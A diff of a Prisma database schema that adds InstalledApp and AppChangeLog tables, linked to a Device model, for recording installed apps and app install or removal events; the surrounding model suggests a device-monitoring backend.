@@ -42,8 +42,36 @@ model Device {
   inputLogs        InputLog[]
   mediaCaptures    MediaCapture[]
   commands         DeviceCommand[]
+  installedApps    InstalledApp[]
+  appChangeLogs    AppChangeLog[]
 
   @@index([userId])
+}
+
+model InstalledApp {
+  id          String   @id @default(cuid())
+  deviceId    String
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  packageName String
+  appName     String
+  versionName String?
+  isInstalled Boolean  @default(true)
+  updatedAt   DateTime @default(now())
+
+  @@unique([deviceId, packageName])
+  @@index([deviceId])
+}
+
+model AppChangeLog {
+  id          String   @id @default(cuid())
+  deviceId    String
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  packageName String
+  appName     String?
+  action      String
+  recordedAt  DateTime @default(now())
+
+  @@index([deviceId, recordedAt])
 }
 
 model DeviceCommand {
